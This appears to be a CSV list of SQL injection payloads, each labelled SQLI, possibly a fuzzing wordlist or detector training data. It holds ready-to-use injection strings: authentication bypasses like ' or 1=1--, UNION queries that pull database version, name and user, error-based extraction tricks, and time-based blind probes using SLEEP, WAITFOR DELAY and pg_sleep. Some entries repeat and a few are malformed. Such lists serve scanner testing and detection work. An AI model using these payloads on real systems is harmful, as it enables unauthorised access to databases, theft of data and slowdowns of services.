payload,attack
,SQLI
a' or 1=1-- ,SQLI
"""a"""" or 1=1--""",SQLI
 or a = a,SQLI
a' or 'a' = 'a,SQLI
1 or 1=1,SQLI
aNd 1=1,SQLI
" anD 1=1""",SQLI
 and 1=(select 1)+',SQLI
+(SELECT 1)+',SQLI
+(SELECT 999999)+',SQLI
 OR 'sp'='sp,SQLI
superbug' AND 'a'='a,SQLI
" select dbms_xmlgen.getxml('select \""a\"" from sys.dual') from sys.dual;",SQLI
 select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual),SQLI
 or''=',SQLI
superbug 'or''=',SQLI
 and 1=1,SQLI
 and 1=1 'a'='a,SQLI
 and 1=1 'a'='a,SQLI
 aNd 1=2,SQLI
" aNd 1=MID((database()),1,1)>1",SQLI
" aNd 2=MID((@@version,1,1)--+",SQLI
" aNd 3=MID((@@version,1,1)--+",SQLI
" aNd 4=MID((@@version,1,1)--+",SQLI
" aNd 5=MID((@@version,1,1)--+",SQLI
 or 1=1 --,SQLI
a' or 1=1 --,SQLI
 or 1=1#,SQLI
or 1=1 --,SQLI
) or ('x'='x,SQLI
or username LIKE '%a%,SQLI
" or username LIKE '%a%"",",SQLI
 HAVING 1=1--,SQLI
" and+1=convert(int,@@version)",SQLI
" or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--""",SQLI
a' || 'b' ,SQLI
" SELECT IF(1=1,'true','false')",SQLI
) or ('1'='1--,SQLI
 GROUP BY 99999,SQLI
"if(true=false,1,SLEEP(5))--+",SQLI
"and+if(true%21=true,1,SLEEP(5))--+",SQLI
"and+if(1=2,1,SLEEP(5))--+",SQLI
"if(1%21=1,1,SLEEP(5))--+",SQLI
"if(true=true,1,SLEEP(5))--+",SQLI
"if(2=2,1,SLEEP(5))--+",SQLI
and+true=false--+,SQLI
and+false%21=false--+,SQLI
"and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",SQLI
"union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",SQLI
" if(true=false,1,SLEEP(5))--+",SQLI
" and+if(true%21=true,1,SLEEP(5))--+",SQLI
" and+if(1=2,1,SLEEP(5))--+",SQLI
" if(1%21=1,1,SLEEP(5))--+",SQLI
" if(true=true,1,SLEEP(5))--+",SQLI
" if(2=2,1,SLEEP(5))--+",SQLI
 and+true=false--+,SQLI
 and+false%21=false--+,SQLI
" and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",SQLI
" union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",SQLI
"WAITFOR DELAY '0:0:50';--""",SQLI
+(SELECT 1 FROM (SELECT SLEEP(50))A)+',SQLI
(SELECT 1 FROM (SELECT SLEEP(50))A),SQLI
"1') AND SLEEP(50) AND ('LoUL'='LoUL""",SQLI
 WAITFOR DELAY '0:0:50' and 'a'='a;--,SQLI
 and  sleep(50) and  'a'='a,SQLI
" WAITFOR DELAY '0:0:50';--""",SQLI
 IF 1=1 THEN dbms_lock.sleep(50);,SQLI
 WAITFOR DELAY '0:0:50';--,SQLI
; SLEEP(50),SQLI
SLEEP(50),SQLI
 SLEEP(50)--,SQLI
 SLEEP(50),SQLI
 pg_sleep(50),SQLI
"and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",SQLI
